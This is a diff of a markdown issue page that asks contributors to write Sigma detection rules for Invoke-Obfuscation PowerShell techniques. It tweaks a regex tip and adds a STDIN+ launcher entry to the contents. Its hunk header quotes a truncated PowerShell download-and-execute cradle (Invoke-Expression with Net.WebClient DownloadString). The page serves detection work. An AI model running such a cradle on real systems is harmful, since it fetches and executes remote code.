@@ -16,7 +16,7 @@ SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('htt
 #### Just pick up the obfuscation method(s) and the appropriate Case(s) # you prefer and write a Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case(s) you solved:  
 (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3,7"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/>
 #### Just in case, a little tip for your regex development:
-e.g., you can copy the results from all of the cases for one obfuscation method and paste them in [regex101](https://regex101.com/) to find possible similarities while developing a regex (you can save your regexes there and even apply a dark theme (: ). 
+e.g., you can copy the results from all of the cases for one obfuscation method and paste them in [regex101](https://regex101.com/) to find possible similarities while developing a regex (you can save your progress there and even apply a dark theme (: ). 
 
 ## Contents
 ##### SINGLE OBFUSCATION
@@ -29,6 +29,7 @@ e.g., you can copy the results from all of the cases for one obfuscation method 
   - [WMIC LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#wmic-launcher-obfuscation)     
   - [RUNDLL LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#rundll-launcher-obfuscation)
   - [VAR+ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#var-launcher-obfuscation)
+  - [STDIN+ LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#stdin-launcher-obfuscation)
 ##### MULTIPLE OBFUSCATION
 
 ### TOKEN OBFUSCATION
